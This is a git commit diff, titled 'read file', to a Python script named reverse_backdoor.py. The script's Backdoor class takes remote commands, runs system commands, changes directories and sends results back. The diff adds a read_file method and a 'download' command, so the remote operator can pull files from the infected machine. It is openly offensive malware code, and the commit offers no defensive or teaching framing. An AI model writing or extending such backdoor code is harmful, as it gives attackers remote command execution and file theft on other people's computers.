f99a793a706adc84a3ee7701c85e45f5e504feef
my9143434 <my9143434@gmail.com>
2019-07-26 13:44:29 -0700

    read file

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -29,6 +29,10 @@ class Backdoor:
 		os.chdir(path)
 		return "[+] Changing working directory to " + path
 
+	def read_file(self, path):
+		with open(path, "rb") as file:
+			return file.read()
+
 # time.sleep(10)
 	def run(self):
 		while True:
@@ -38,6 +42,8 @@ class Backdoor:
 				exit()
 			elif command[0] == "cd" and len(command) > 1:
 				command_result = self.change_working_directory_to(command[1])
+			elif command[0] == "download":
+				command_result = self.read_file(command[1])
 			else:
 				command_result = self.execute_system_command(command) 
 			self.reliable_send(command_result)
